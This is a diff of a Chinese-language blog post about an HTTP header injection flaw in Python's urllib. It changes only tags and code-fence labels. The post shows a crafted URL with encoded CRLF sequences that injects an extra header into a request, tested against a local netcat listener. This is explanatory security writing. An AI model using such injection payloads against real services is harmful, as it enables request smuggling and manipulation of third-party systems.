@@ -4,7 +4,7 @@ layout: post
 title: 'Python urllib HTTP头注入漏洞'
 date: 2016-06-17 19:34:00
 author: virusdefender
-tags: 
+tags: 安全 Python
 ---
 
 已经发在了乌云知识库 http://drops.wooyun.org/papers/16905
@@ -37,19 +37,19 @@ except urllib.error.URLError as e:
 
 这段代码只是从命令行参数接收一个URL，然后去访问它。为了查看`urllib`获取的HTTP头，我们用一个nc来监听端口。
 
-```clike
+```
 nc -l -p 12345
 ```
 
 在正常的代码中，我们可以这样访问
 
-```clike
+```
 ./fetch3.py http://127.0.0.1:12345/foo
 ```
 
 返回的HTTP头是
 
-```clike
+```
 GET /foo HTTP/1.1
 Accept-Encoding: identity
 User-Agent: Python-urllib/3.4
@@ -59,13 +59,13 @@ Host: 127.0.0.1:12345
 
 然后我们使用恶意构造的地址
 
-```clike
+```
 ./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo
 ```
 
 返回的HTTP头就是
 
-```clike
+```
 GET /foo HTTP/1.1
 Accept-Encoding: identity
 User-Agent: Python-urllib/3.4
